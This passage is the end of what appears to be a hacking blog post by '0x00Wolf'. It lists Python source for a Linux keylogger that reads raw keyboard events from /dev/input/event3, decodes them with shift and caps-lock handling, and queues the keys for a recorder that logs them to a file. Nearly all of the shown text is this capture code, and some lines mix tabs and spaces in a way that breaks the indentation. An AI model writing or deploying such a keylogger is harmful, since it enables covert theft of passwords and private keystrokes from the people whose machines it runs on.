            # otherwise if leftshift or rightshift set shift to True
            elif event_code == 42 or event_code == 54:
                shift = True

            # if capslock is pressed !capslock
            elif event_code == 58 and value == 1:
                if caps_lock:
			caps_lock = False
		    else:
			caps_lock = True
	
            # otherwise if a key is pressed
            elif value == 1:
	
                # if neither capslock or shift
                if not shift and not caps_lock:
                    key = KEYMAP[event_code]
	
                # if just shift special symbols & capital letters
                elif shift and not caps_lock:
                    key = SHIFTED[event_code]

                # if just caps lock only allow capital letters & NOT special symbols
                elif caps_lock and not shift:
                    if 16 <= event_code <= 25 or 30 <= event_code <= 38 or 44 <= event_code <= 50:
                        key = SHIFTED[event_code]
                    else:
                        key = KEYMAP[event_code]
	
                # if both allow special symbols & lowercase letters
                elif shift and caps_lock:
                    if 16 <= event_code <= 25 \
			or 30 <= event_code <= 38 or 44 <= event_code <= 50:
                        key = KEYMAP[event_code]
                    else:
                        key = SHIFTED[event_code]

                # pass the parsed data to the writer
                q2.put(key)


def producer():
    """Opens the /dev/input/event for the keyboard and reads the binary stream in event sized chunks
    and puts those into the first queue for the parser"""
    fp = open('/dev/input/event3', "rb")
    while True:
        event = fp.read(EVENT_SIZE)
        if not event:
            break
        q.put(event)
    fp.close()


try:
    t1 = Thread(target=producer)  # Producer gets keyboard events
    t1.start()
    t2 = Thread(target=consumer)  # Consumer parses keys from keyboard events
    t2.start()
    t3 = Thread(target=recorder)  # Recorder writes keys to the log file and handles backspaces
    t3.start()
except KeyboardInterrupt:
    t1.join()
    t2.join()
    t3.join()
    print('exiting')
    sys.exit()
```

Explanations are in the comments! That's it for this post.

-0x00Wolf

